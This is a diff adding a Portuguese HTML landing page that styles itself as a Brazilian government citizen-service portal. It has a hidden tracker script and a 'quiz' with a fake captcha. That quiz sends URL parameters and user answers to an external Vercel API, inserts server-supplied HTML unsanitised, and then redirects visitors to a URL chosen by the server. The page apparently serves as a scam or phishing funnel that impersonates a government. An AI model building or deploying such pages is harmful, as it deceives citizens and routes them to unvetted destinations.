@@ -1,0 +1,740 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Central de Atendimento ao Cidadão - Realize consultas de forma rápida e segura com nossa plataforma.">
+    <meta name="author" content="Governo do Brasil">
+    <meta name="robots" content="index, follow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Central de Atendimento ao Cidadão</title>
+    <link rel="stylesheet" href="css/all.min.css">
+
+<div style="display: none;">
+    <script id="_wau2ha">
+        var _wau = _wau || [];
+        _wau.push(["dynamic", "0gtq2o3n9q", "2ha", "c4302bffffff", "small"]);
+    </script>
+    <script async src="//waust.at/d.js"></script>
+    </div>
+
+
+    <!-- CSS Otimizado -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to bottom, #f0f8ff, #e3f2fd);
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .container {
+            text-align: center;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .title {
+            font-size: clamp(24px, 5vw, 28px);
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #009739;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            line-height: 1.3;
+        }
+
+        .subtitle {
+            font-size: clamp(15px, 3.5vw, 16px);
+            color: #555;
+            margin-bottom: 30px;
+            line-height: 1.6;
+            font-weight: 500;
+        }
+
+        .button {
+            display: inline-block;
+            background-color: #009739;
+            color: #ffffff;
+            padding: clamp(15px, 4vw, 18px) clamp(25px, 7vw, 35px);
+            font-size: clamp(17px, 4vw, 20px);
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: background-color 0.3s, transform 0.2s;
+            box-shadow: 0 4px 8px rgba(0, 151, 57, 0.2);
+            margin: 15px 0;
+            border: none;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #007b29;
+            transform: scale(1.03);
+        }
+
+        .button:active {
+            transform: scale(0.98);
+        }
+
+        .links {
+            margin-top: 25px;
+            font-size: clamp(13px, 3vw, 14px);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .links a {
+            color: #009739;
+            text-decoration: none;
+            transition: color 0.3s;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        .links a:hover {
+            color: #007b29;
+            text-decoration: underline;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: clamp(11px, 2.5vw, 12px);
+            color: #777;
+            line-height: 1.5;
+        }
+
+        footer a {
+            color: #009739;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        footer a:hover {
+            color: #007b29;
+        }
+
+        #typebotContainer {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .quiz-modal {
+            display: block;
+            width: 90%;
+            max-width: 500px;
+            max-height: 80%;
+            background: #fff;
+            border-radius: 12px;
+            overflow: hidden;
+            animation: slideIn 0.5s ease-in-out;
+            position: relative;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .quiz-close {
+            position: absolute;
+            right: 15px;
+            top: 15px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #999;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .quiz-close:hover {
+            color: #333;
+        }
+
+        .quiz-content {
+            padding: 40px;
+            text-align: center;
+        }
+
+        .quiz-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 32px;
+        }
+
+        .quiz-icon.green { background-color: #e8f5e8; color: #009739; }
+        .quiz-icon.blue { background-color: #e3f2fd; color: #1976d2; }
+
+        .quiz-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .robot-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .quiz-description {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .quiz-question {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            padding: 25px;
+            border-radius: 12px;
+            margin: 25px 0;
+            border: 2px solid #009739;
+            box-shadow: 0 4px 12px rgba(0, 151, 57, 0.1);
+            line-height: 1.4;
+        }
+
+        .highlight-number {
+            background: linear-gradient(135deg, #009739, #007b29);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 28px;
+            font-weight: 800;
+            display: inline-block;
+            margin: 0 8px;
+            box-shadow: 0 4px 8px rgba(0, 151, 57, 0.3);
+            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .quiz-help {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 20px;
+            font-style: italic;
+        }
+
+        .quiz-input {
+            width: 100%;
+            padding: 18px;
+            font-size: 24px;
+            border: 3px solid #009739;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: 700;
+            background: #f8f9fa;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 8px rgba(0, 151, 57, 0.1);
+        }
+
+        .quiz-input:focus {
+            outline: none;
+            border-color: #007b29;
+            background: white;
+            box-shadow: 0 4px 16px rgba(0, 151, 57, 0.2);
+            transform: scale(1.02);
+        }
+
+        .quiz-input::placeholder {
+            color: #999;
+            font-weight: 500;
+        }
+
+        .quiz-button {
+            background: linear-gradient(135deg, #009739, #007b29);
+            color: white;
+            padding: 18px 35px;
+            font-size: 20px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            width: 100%;
+            box-shadow: 0 4px 12px rgba(0, 151, 57, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .quiz-button:hover {
+            background: linear-gradient(135deg, #007b29, #006622);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 151, 57, 0.4);
+        }
+
+        .quiz-button:active {
+            transform: translateY(0);
+        }
+
+        .quiz-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #009739;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background-color: #f0f0f0;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background-color: #009739;
+            transition: width 3s ease-out;
+        }
+
+        .progress-steps {
+            font-size: 12px;
+            color: #999;
+            margin-top: 15px;
+        }
+
+        .progress-steps p {
+            margin: 5px 0;
+        }
+
+        .error-message {
+            background-color: #ffebee;
+            color: #c62828;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        /* Responsividade para telas muito pequenas */
+        @media (max-width: 400px) {
+            .container {
+                padding: 25px 20px;
+            }
+            
+            .links {
+                gap: 8px;
+            }
+
+            .quiz-content {
+                padding: 30px 20px;
+            }
+
+            .highlight-number {
+                font-size: 24px;
+                padding: 6px 12px;
+            }
+
+            .quiz-question {
+                font-size: 20px;
+                padding: 20px;
+            }
+
+            .quiz-input {
+                font-size: 20px;
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="title">CONSULTAR FACIL</h1>
+        <p class="subtitle">Clique no botão abaixo para acessar serviços públicos de forma rápida e segura.</p>
+        <a id="chatButton" class="button" href="#">
+            <i class="fas fa-comments"></i> CONSULTAR AGORA
+        </a>
+        <div class="links">
+            <a href="politica-privacidade.html"><i class="fas fa-shield-alt"></i> Política de Privacidade</a>
+            <a href="termos-uso.html"><i class="fas fa-file-alt"></i> Termos de Uso</a>
+            <a href="servicos.html"><i class="fas fa-cogs"></i> Serviços</a>
+        </div>
+        <footer>
+            2025 Consultar Facil Brasil. Todos os direitos reservados. <a href="servicos.html">Contato</a>
+        </footer>
+    </div>
+
+    <!-- Container do Quiz (substituindo o Typebot) -->
+    <div id="typebotContainer">
+        <div class="quiz-modal">
+            <button id="closeQuiz" class="quiz-close">X</button>
+            <div id="quizContent" class="quiz-content">
+                <!-- Conteúdo será carregado dinamicamente -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Script do Quiz (substituindo o Typebot) -->
+    <script>
+        // Quiz Modal Controller
+        class QuizModal {
+            constructor() {
+                this.modal = document.getElementById('typebotContainer');
+                this.content = document.getElementById('quizContent');
+                this.closeBtn = document.getElementById('closeQuiz');
+                this.currentStep = null;
+                this.sessionId = null;
+                this.userData = {};
+                
+                this.init();
+            }
+
+            init() {
+                // Mostrar o Quiz ao clicar no botão (mesmo comportamento do Typebot)
+                const chatButton = document.getElementById('chatButton');
+                chatButton.addEventListener('click', (event) => {
+                    event.preventDefault();
+                    this.open();
+                });
+
+                this.closeBtn.addEventListener('click', () => this.close());
+                
+                // Fechar Quiz ao clicar fora (mesmo comportamento do Typebot)
+                this.modal.addEventListener('click', (event) => {
+                    if (event.target === this.modal) {
+                        this.close();
+                    }
+                });
+            }
+
+            async open() {
+                this.modal.style.display = 'flex';
+                await this.startQuiz();
+            }
+
+            close() {
+                this.modal.style.display = 'none';
+                this.reset();
+            }
+
+            reset() {
+                this.currentStep = null;
+                this.sessionId = null;
+                this.userData = {};
+                this.content.innerHTML = '';
+            }
+
+            async startQuiz() {
+                try {
+                    this.showLoading('Iniciando consulta...');
+
+                    // Capturar parâmetros da URL
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const params = {};
+                    urlParams.forEach((value, key) => {
+                        params[key] = value;
+                    });
+
+                    const response = await fetch('https://consultasemtype-api.vercel.app/api/step?id=1', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ urlParams: params })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        this.sessionId = data.sessionId;
+                        this.userData.urlParams = params;
+                        this.renderStep(data.step);
+                    } else {
+                        this.showError(data.error || 'Erro ao inicializar consulta');
+                    }
+                } catch (error) {
+                    console.error('Erro ao iniciar quiz:', error);
+                    this.showError('Erro de conexão. Tente novamente.');
+                }
+            }
+
+            async nextStep(stepData = {}) {
+                try {
+                    this.showLoading('Processando...');
+            
+                    let nextStepId;
+            
+                    // Decide o próximo ID com base no ID atual
+                    switch (this.currentStep?.id) {
+                        case 1:
+                            nextStepId = 2;
+                            break;
+                        case 2:
+                            nextStepId = 3;
+                            break;
+                        default:
+                            nextStepId = 1;
+                    }
+            
+                    const response = await fetch(`https://consultasemtype-api.vercel.app/api/step?id=${nextStepId}`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            stepData: {
+                                ...stepData,
+                                currentStep: this.currentStep?.id,
+                                sessionId: this.sessionId
+                            }
+                        })
+                    });
+            
+                    const data = await response.json();
+            
+                    if (data.success) {
+                        if (data.userData) {
+                            this.userData = { ...this.userData, ...data.userData };
+                        }
+            
+                        this.renderStep(data.step);
+            
+                        // Auto-redirect se necessário
+                        if (data.step.autoRedirect) {
+                            setTimeout(() => {
+                                this.handleRedirect();
+                            }, data.step.redirectDelay || 3000);
+                        }
+                    } else {
+                        this.showError(data.error || 'Erro ao processar');
+                    }
+                } catch (error) {
+                    console.error('Erro ao processar etapa:', error);
+                    this.showError('Erro de conexão. Tente novamente.');
+                }
+            }
+            async handleRedirect() {
+                try {
+                    const response = await fetch('https://consultasemtype-api.vercel.app/api/step?id=3', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ userData: this.userData })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        // Google Ads Conversion (usando os IDs do seu código)
+                        if (typeof gtag !== 'undefined') {
+                            /*
+                            gtag('event', 'conversion', {
+                                'send_to': 'AW-715234635/CONVERSION_LABEL',
+                                'value': 1.0,
+                                'currency': 'BRL'
+                            });
+                            gtag('event', 'conversion', {
+                                'send_to': 'AW-11088821139/CONVERSION_LABEL',
+                                'value': 1.0,
+                                'currency': 'BRL'
+                            });
+                            */
+                        }
+
+                        // Redirecionar na mesma aba
+                        window.location.href = data.redirectUrl;
+                    } else {
+                        this.showError('Erro ao gerar redirecionamento');
+                    }
+                } catch (error) {
+                    console.error('Erro no redirecionamento:', error);
+                    this.showError('Erro ao processar redirecionamento');
+                }
+            }
+
+            renderStep(step) {
+                this.currentStep = step;
+                
+                let html = ``;
+
+                if (step.type === 'captcha') {
+                    html = `
+                        <div class="quiz-icon ${step.iconColor}">
+                            ${this.getIcon(step.icon)}
+                        </div>
+                        <h2 class="robot-title">${step.title}</h2>
+                        ${step.question ? `<div class="quiz-question">${step.question}</div>` : ''}
+                        <form onsubmit="quiz.handleCaptchaSubmit(event)">
+                            <input 
+                                type="${step.input.type}" 
+                                id="quizInput"
+                                placeholder="${step.input.placeholder}"
+                                class="quiz-input"
+                                ${step.input.required ? 'required' : ''}
+                                min="${step.input.validation?.min || 0}"
+                                max="${step.input.validation?.max || 999}"
+                                autofocus
+                            />
+                            <button type="submit" class="quiz-button">
+                                ${step.button?.text || 'VERIFICAR'}
+                            </button>
+                        </form>
+                    `;
+                } else {
+                    // Código normal para outros tipos...
+                    html = `
+                        <div class="quiz-icon ${step.iconColor}">
+                            ${this.getIcon(step.icon)}
+                        </div>
+                        <h2 class="quiz-title">${step.title}</h2>
+                        <p class="quiz-description">${step.description}</p>
+                        ${step.question ? `<div class="quiz-question">${step.question}</div>` : ''}
+                        ${step.helpText ? `<p class="quiz-help">${step.helpText}</p>` : ''}
+                        ${step.loadingText ? `<p style="font-size: 14px; color: #999; margin-bottom: 20px;">${step.loadingText}</p>` : ''}
+                    `;
+                }
+
+                if (step.type === 'welcome' && step.button) {
+                    html += `
+                        <button onclick="quiz.nextStep()" class="quiz-button">
+                            ${step.button.text}
+                        </button>
+                    `;
+                }
+
+                if (step.type === 'loading') {
+                    // Esconder botão de fechar
+                    this.closeBtn.style.display = 'none';
+                    
+                    html += `
+                        <div class="progress-bar">
+                            <div class="progress-fill" style="width: 100%"></div>
+                        </div>
+                    `;
+
+                    if (step.progressSteps) {
+                        html += '<div class="progress-steps">';
+                        step.progressSteps.forEach(stepText => {
+                            html += `<p>${stepText}</p>`;
+                        });
+                        html += '</div>';
+                    }
+                } else {
+                    this.closeBtn.style.display = 'block';
+                }
+                
+                this.content.innerHTML = html;
+            }
+
+            handleCaptchaSubmit(event) {
+                event.preventDefault();
+                const input = document.getElementById('quizInput');
+                const value = input.value.trim();
+                
+                if (!value) return;
+                
+                this.nextStep({ captcha: parseInt(value) });
+            }
+
+            getIcon(iconName) {
+                switch (iconName) {
+                    case 'check-circle':
+                        return '<i class="fas fa-check-circle"></i>';
+                    case 'shield':
+                        return '<i class="fas fa-shield-alt"></i>';
+                    case 'loader':
+                        return '<i class="fas fa-spinner fa-spin"></i>';
+                    default:
+                        return '<i class="fas fa-check-circle"></i>';
+                }
+            }
+
+            showLoading(message) {
+                this.content.innerHTML = `
+                    <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
+                        <div class="spinner"></div>
+                        <span>${message}</span>
+                    </div>
+                `;
+            }
+
+            showError(message) {
+                this.content.innerHTML = `
+                    <div class="quiz-icon" style="background-color: #ffebee; color: #c62828;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <h2 class="quiz-title" style="color: #c62828;">Erro</h2>
+                    <div class="error-message">${message}</div>
+                    <button onclick="quiz.close()" class="quiz-button" style="background-color: #666;">
+                        Fechar
+                    </button>
+                `;
+            }
+        }
+
+        // Inicializar quiz
+        const quiz = new QuizModal();
+    </script>
+
+
+</body></html>
